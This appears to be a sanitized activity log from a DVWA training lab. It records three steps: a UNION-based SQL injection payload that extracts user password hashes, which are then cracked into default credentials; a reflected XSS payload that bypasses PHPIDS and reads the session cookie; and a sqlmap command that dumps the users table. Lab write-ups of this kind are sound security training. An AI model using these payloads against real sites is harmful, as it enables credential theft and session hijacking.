# Activity Logs (Sanitized)

## Task 1: SQL Injection Discovery
- **Target:** `[http://172.20.](http://172.20.)X.2/dvwa/vulnerabilities/sqli/`
- **Manual Payload:** `' UNION SELECT user, password FROM users-- -`
- **Result:** Successfully extracted 5 MD5 hashes.
- **Cracking:** Used online Rainbow Tables (CrackStation). 
    - `admin` : `password`
    - `gordonb` : `abc123`
    - `pablo` : `letmein`

## Task 2: Reflected XSS & Session Theft
- **Target:** `[http://172.20.](http://172.20.)X.2/dvwa/vulnerabilities/xss_r/`
- **Bypass:** Standard `<script>` was flagged by PHPIDS on some levels; used `<img src=x onerror=alert(document.cookie)>` to bypass.
- **Exfiltrated Data:** 
    - `PHPSESSID`: `68261848258ac39623af8c85a9759fc8`
    - `security`: `low`

## Task 3: Automated SQLi (sqlmap)
- **Command:** `sqlmap -u [URL] --cookie=[REDACTED] -D dvwa -T users --dump`
- **Efficiency:** Extracted 7 databases and cracked all hashes in the `users` table within minutes.
- **Database Version:** MySQL >= 5.0.12.
